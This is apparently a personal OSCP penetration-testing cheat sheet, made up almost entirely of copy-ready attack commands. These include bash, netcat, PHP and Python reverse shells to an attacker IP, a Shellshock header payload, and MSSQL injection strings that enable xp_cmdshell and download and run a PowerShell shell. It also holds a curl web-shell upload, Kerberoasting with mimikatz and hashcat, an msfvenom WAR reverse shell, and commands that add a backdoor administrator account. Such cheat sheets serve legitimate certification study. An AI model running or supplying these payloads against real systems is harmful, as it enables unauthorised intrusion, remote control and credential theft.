---
title: OSCP Cheat Sheet
date: 2021-06-13 06:25:40
tags:
- OSCP
- Penetration Test

---

# Pentest Cheatsheet

Bash reverse shell

```bash
bash -i >& /dev/tcp/192.168.19.35/8907 0>&1
```

```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.119.142/8908 0>&1"
```

Shellshock

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'id'" \
http://localhost:8080/cgi-bin/test.bin | tail
```

python PTY upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

MSSQL enable xp_cmdshell

```sql
';exec sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

MSSQL reverse shell with one-liner

```sql
exec master..xp_cmdshell "powershell -c iex(New-Object net.webclient).DownloadString('http://192.168.119.142:12345/Invoke-PowerShellTcpOneLine.ps1')"
```

MSSQL enable xp_cmdshell and exec

```sql
';exec sp_configure 'xp_cmdshell', 1; RECONFIGURE;exec master..xp_cmdshell "powershell -c iex(New-Object net.webclient).DownloadString('http://192.168.119.142:12345/Invoke-PowerShellTcpOneLine.ps1')";--
```

MSSQL check for stack query

```sql
'; WAITFOR DELAY '0:0:5'; --
```

nc reverse shell

```bash
nc -e /bin/bash 192.168.119.142 8907
```

PHP reverse shell with python

```php
<?php system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.119.142\",8907));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");?>
```

PHP reverse shell with python with double quote escaped

```php
<?php system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.119.142\",8907));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'");?>
```

PHP reverse shell with bash -c

```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/\"192.168.119.142\"/443 0>&1'");?>
```

PHP reverse shell with bash (won't work on /bin/sh -> /bin/dash)

```php
php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.119.142/8908 0>&1");'
```

PHP reverse shell with bash -c with double quote escaped

```bash
php -r 'exec("/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.119.142/8908 0>&1\"");'
```

socat TTY upgrade

```bash
socat file:`tty`,raw,echo=0 tcp-listen:8908
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.142:8908
```

curl multipart/form-data file upload example

```bash
curl -F files=@ciph3r.php http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php
```

Powershell reverse shell

```powershell
powershell -c iex(New-Object net.webclient).DownloadString('http://192.168.119.142:12345/Invoke-PowerShellTcpOneLine.ps1')
```

Kerberoast

```powershell
# Get Users with SPNs
.\GetUserSPNs.sp1
# Get Service Tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/xor-app23.xor.com:1433"
# Extract Tickets
mimikatz # kerberos::list /export
# Crack Tickets with tgsrepcrack.py
./tgsrepcrack.py rockyou.txt 2-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi
# Or Hashcat/JohnTheRipper(much faster)
./kirbi2john.py ../2-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi >> ../kerberos.hash
.\hashcat.exe -m 13100 -a 0 F:\kerberos.hash F:\rockyou.txt
```

Powershell Invoke-WebRequest

```powershell
powershell -c Invoke-WebRequest http://192.168.119.142:12345/
```

Java War file reverse shell

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.142 LPORT=8907 -f war > cipher.war
```

Windows show hidden files

[How-to｜Show Hidden Files Using Command Lines in Windows 10/8/7](https://www.diskpart.com/articles/show-hidden-files-command-line-8523.html)

```powershell
dir /a:h /b /s
```

MSSQL get other table from other databse

```sql
SELECT other_database..syscolumns.name, TYPE_NAME(other_database..syscolumns.xtype),NULL FROM other_database..syscolumns, other_database..sysobjects WHERE other_database..syscolumns.id=other_database..sysobjects.id AND other_database..sysobjects.name='other_table'--
```

Windows create remote login user

```powershell
net user /add cipher cipher
net localgroup administrators cipher /add
```

Runas Administrator

```powershell
runas /user:administrator <command>
```

Openssl Generate passwd

```bash
openssl passwd -1 -salt cipher cipher
```